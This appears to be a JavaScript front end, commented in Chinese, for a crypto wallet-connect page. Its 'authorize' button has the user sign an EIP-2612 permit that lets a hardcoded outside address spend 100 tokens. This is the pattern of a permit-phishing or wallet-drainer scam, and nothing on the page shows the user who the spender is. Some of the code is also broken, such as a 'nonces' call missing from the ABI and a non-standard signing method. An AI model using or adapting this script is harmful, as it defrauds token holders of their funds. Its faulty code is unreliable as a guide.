const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
let web3;
let isConnected = false;
let isRequestPending = false;
let account;
let tokenContract;

// ERC20标准合约的ABI (包含permit方法)
const erc20Abi = [
    {
        "constant": false,
        "inputs": [
            {"name": "owner", "type": "address"},
            {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"},
            {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"},
            {"name": "r", "type": "bytes32"},
            {"name": "s", "type": "bytes32"}
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 连接钱包的按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = 'metamask'; // 假设默认选择 MetaMask
    await connectWallet(selectedWallet);
};

// 连接钱包的函数
async function connectWallet(walletType) {
    if (isRequestPending) {
        alert('已有请求在处理，请稍等');
        return;
    }

    isRequestPending = true;

    try {
        if (walletType === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);

                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    account = accounts[0];
                    tokenContract = new web3.eth.Contract(erc20Abi, '0xYourTokenContractAddress'); // 填写合约地址
                    updateWalletList(account);
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';
                    document.getElementById('authorizeButton').disabled = false; // 启用授权按钮
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        }
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    } finally {
        isRequestPending = false;
    }
}

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 授权按钮点击事件
document.getElementById('authorizeButton').onclick = async () => {
    if (!isConnected) {
        document.getElementById('status').innerText = '请先连接钱包';
        return;
    }

    try {
        const nonce = await tokenContract.methods.nonces(account).call();
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 分钟过期

        // 签名信息
        const domain = {
            name: 'YourTokenName',
            version: '1',
            chainId: await web3.eth.getChainId(),
            verifyingContract: tokenContract.options.address
        };

        const permitData = {
            owner: account,
            spender: recipientAddress,
            value: web3.utils.toWei('100', 'ether'),
            nonce: nonce,
            deadline: deadline
        };

        // 使用 EIP-712 进行签名
        const signature = await web3.eth.signTypedDataV4(account, JSON.stringify({
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" }
                ],
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            },
            primaryType: 'Permit',
            domain: domain,
            message: permitData
        }));

        const { v, r, s } = getSignatureParameters(signature);

        // 调用合约的 permit 方法进行授权
        await tokenContract.methods.permit(account, recipientAddress, web3.utils.toWei('100', 'ether'), deadline, v, r, s).send({ from: account });
        document.getElementById('status').innerText = 'Permit 授权成功';
        document.getElementById('signButton').disabled = false; // 启用签名按钮
    } catch (error) {
        document.getElementById('status').innerText = '授权失败: ' + error.message;
    }
};

// 签名按钮点击事件
document.getElementById('signButton').onclick = async () => {
    // 签名逻辑可以放在这里
    // 如果不需要额外的签名流程，可以省略这部分代码
    document.getElementById('status').innerText = '签名按钮被点击，但目前没有额外的签名逻辑。';
};

// 获取签名参数
function getSignatureParameters(signature) {
    const r = signature.slice(0, 66);
    const s = '0x' + signature.slice(66, 130);
    const v = parseInt(signature.slice(130, 132), 16);
    return { v, r, s };
}
